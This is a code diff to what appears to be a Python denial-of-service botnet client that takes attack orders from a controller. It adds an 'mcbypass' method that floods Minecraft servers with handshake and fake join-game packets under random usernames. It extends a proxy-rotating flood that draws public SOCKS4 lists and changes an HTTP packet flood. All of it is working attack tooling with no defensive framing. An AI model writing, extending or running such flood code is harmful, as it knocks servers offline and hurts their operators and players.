@@ -1,9 +1,9 @@
 from urllib.parse import urlparse
-import ssl
 import socket
 import cfscrape
 import struct
 import string
+import mcstatus
 import requests
 import random
 import threading
@@ -96,13 +96,25 @@ def minecraft(addr, proto, until):
         sock.close()
 
 
+def mcbypass(addr, proto, until):
+    mcstatus.MinecraftServer.lookup(addr).status()
+    time.sleep(4)
+    while until > time.time():
+        sock = socket.socket()
+        sock.connect((addr.split(":")[0], int(addr.split(":")[1])))
+        sock.send(handshake_packet(addr.split(":")[0], int(addr.split(":")[1]), int(proto), 2) +
+                  join_game_packet(randstr(random.randint(13, 16))))
+        sock.close()
+
+
 def minecraft_proxy(addr, proto, proxies, until):
     while until > time.time():
         sock = socks.socksocket()
         proxy = random.choice(proxies).split(":")
         sock.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
         sock.connect((addr.split(":")[0], int(addr.split(":")[1])))
-        sock.send(handshake_packet(addr.split(":")[0], int(addr.split(":")[1]), int(proto), 2))
+        sock.send(handshake_packet(addr.split(":")[0], int(addr.split(":")[1]), int(proto), 2) +
+                  join_game_packet(randstr(random.randint(13, 16))))
         sock.close()
 
 
@@ -112,8 +124,6 @@ def http_pps(url, until):
     while until > time.time():
         sock = socket.socket()
         sock.connect((url.hostname, int(url.port)))
-        if url.scheme == "https":
-            sock = ssl.wrap_socket(sock)
         sock.send(packet.encode())
         sock.close()
 
@@ -176,6 +186,9 @@ def run_bot():
                     elif method == "minecraft":
                         for _ in range(threads):
                             threading.Thread(target=minecraft, args=(addr, int(data["data"]["other"][0]), time.time() + seconds)).start()
+                    elif method == "mcbypass":
+                        for _ in range(threads):
+                            threading.Thread(target=mcbypass, args=(addr, int(data["data"]["other"][0]), time.time() + seconds)).start()
                     elif method == "minecraftproxy":
                         proxies = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt").text.splitlines()[2:]
                         for _ in range(threads):
